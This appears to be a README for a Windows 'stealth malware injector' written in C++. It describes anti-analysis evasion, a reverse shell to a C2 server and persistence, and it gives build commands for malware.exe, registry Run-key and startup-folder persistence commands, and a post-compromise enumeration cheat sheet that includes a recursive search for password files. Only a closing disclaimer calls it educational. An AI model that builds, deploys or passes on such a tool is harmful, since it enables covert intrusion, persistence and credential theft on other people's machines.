# Malware Stealth Injector

## Project Overview
This program is a stealth malware injector designed to evade analysis, maintain persistence, and establish reverse shell connections. The code leverages various anti-analysis techniques, persistence mechanisms, and remote command execution capabilities.

### Key Features
- **Stealth Execution**: Runs as a hidden process.
- **Anti-Analysis**: Checks for debuggers, sandboxes, and virtual machines to avoid detection.
- **Persistence**: Ensures the malware is executed during system startup.
- **Reverse Shell**: Establishes a reverse shell connection to a specified C2 server.

## File Structure
```
ProjectDirectory/
│
├── include/
│   ├── main.h
│   ├── Authenticator.h
│   ├── Utilities.h
│   ├── Paths.h
│   ├── AnalysisEvasion.h
│   └── ReverseShell.h
│
└── src/
    ├── main.cpp
    ├── Authenticator.cpp
    ├── Utilities.cpp
    ├── Paths.cpp
    ├── AnalysisEvasion.cpp
    ├── persistence.cpp
    └── ReverseShell.cpp
```

## Compilation Instructions

Compile the project using the following `g++` command:

```bash
g++ -o malware.exe main.cpp ReverseShell.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp self_destruct.cpp exfiltrator.cpp gatherer.cpp -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -Iinclude -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -lshlwapi -static -std=c++17 -pthread -Wno-deprecated-declarations -mwindows

 compile without window
g++ -Wno-deprecated-declarations -mwindows -IC:/mingw64/include -IC:/crypto -IC:/fmt-11.0.2/fmt-11.0.2/include -IC:/Users/alexa/json/include -I. -LC:/mingw64/lib -LC:/OpenSSL-Win64/lib/VC/x64/MD -LC:/curl-8.11.0_1-win64-mingw/lib -o malware_secret.exe main.cpp ReverseShell.cpp utils.cpp persistence.cpp AnalysisEvasion.cpp Paths.cpp Authenticator.cpp Utilities.cpp -lcurl -lssl -lcrypto -lgdi32 -luser32 -lkernel32 -lole32 -loleaut32 -lws2_32 -luuid -lwbemuuid -lwinhttp -static 
```

## How to Use This Tool

### 1. Persistence
Ensure the malware persists across system reboots by adding it to the registry and startup folder.

#### Add to Registry
```bash
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "malware" /t REG_SZ /d "C:\ProgramData\malware.exe"
```

#### Verify Registry Entry
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### Copy Executable to System Location
```bash
copy "C:\Users\johns\Downloads\malware.exe" "C:\ProgramData\malware.exe"
```

### Add to Startup Folder
```bash
copy "C:\Users\shiti\Downloads\malware.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"
```

### 2. System Information

#### General System Info
```bash
systeminfo
```

#### Operating System Version
```bash
ver
```

#### Detailed OS Info
```bash
wmic os get Caption, Version, BuildNumber, OSArchitecture
```

#### BIOS Information
```bash
wmic bios get Manufacturer, Version, SerialNumber
```

#### System Boot Time
```bash
wmic os get LastBootUpTime
```

#### List Environment Variables
```bash
set
```

### 3. User and Group Enumeration

#### List All Users
```bash
net user
```

#### Detailed User Info
```bash
net user [username]
```

#### List All Groups
```bash
net localgroup
```

#### Members of Administrators Group
```bash
net localgroup administrators
```

#### Current Logged-in User
```bash
whoami
```

#### List User Privileges
```bash
whoami /priv
```

#### Domain Info (if domain-joined)
```bash
net config workstation
```

### 4. Network Enumeration

#### IP Configuration
```bash
ipconfig /all
```

#### List Open Ports
```bash
netstat -an
```

#### List Active Connections
```bash
netstat -ano
```

#### ARP Table
```bash
arp -a
```

#### Routing Table
```bash
route print
```

#### Network Shares
```bash
net share
```

#### Mapped Drives
```bash
net use
```

#### DNS Cache
```bash
ipconfig /displaydns
```

#### Firewall Configuration
```bash
netsh firewall show state
```

### 5. Installed Applications and Updates

#### List Installed Programs
```bash
wmic product get Name, Version
```

#### List Installed Hotfixes/Updates
```bash
wmic qfe get Description, HotFixID, InstalledOn
```

#### List Startup Programs
```bash
wmic startup get Caption, Command
```

### 6. Services and Processes

#### List All Services
```bash
sc query state= all
```

#### List Running Processes
```bash
tasklist
```

#### Detailed Process Info
```bash
wmic process get Name, ProcessId, CommandLine
```

#### Check Scheduled Tasks
```bash
schtasks /query /fo LIST /v
```

### 7. File and Directory Enumeration

#### List Files and Directories (Recursive)
```bash
dir /s
```

#### List Hidden Files
```bash
dir /a:h
```

#### Find Files Containing Keywords
```bash
findstr /s /i "password" *.*
```

#### Check File Permissions
```bash
icacls [filename]
```

#### Search for Executable Files
```bash
dir *.exe /s /b
```

### 8. Security Policies and Configuration

#### Local Security Policy Export
```bash
secedit /export /cfg C:\security_policy.cfg
```

#### Group Policy Results
```bash
gpresult /v
```

#### Audit Policy
```bash
auditpol /get /category:*
```

#### Registry Autoruns
```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

### 9. Windows Event Logs

#### System Logs
```bash
wevtutil qe System /c:5 /f:text
```

#### Security Logs
```bash
wevtutil qe Security /c:5 /f:text
```

#### Application Logs
```bash
wevtutil qe Application /c:5 /f:text
```

### 10. Miscellaneous Commands

#### Disk Usage and Free Space
```bash
fsutil volume diskfree C:
```

#### Check System Uptime
```bash
net stats srv
```

#### System Drives Info
```bash
wmic logicaldisk get DeviceID, FileSystem, FreeSpace, Size, VolumeName
```

#### Check for Open Files
```bash
openfiles /query
```

#### View Running Services
```bash
tasklist /svc
```

---

## Notes
This program is intended for **educational purposes only**. Use it responsibly and ensure you have permission before testing it on any system.
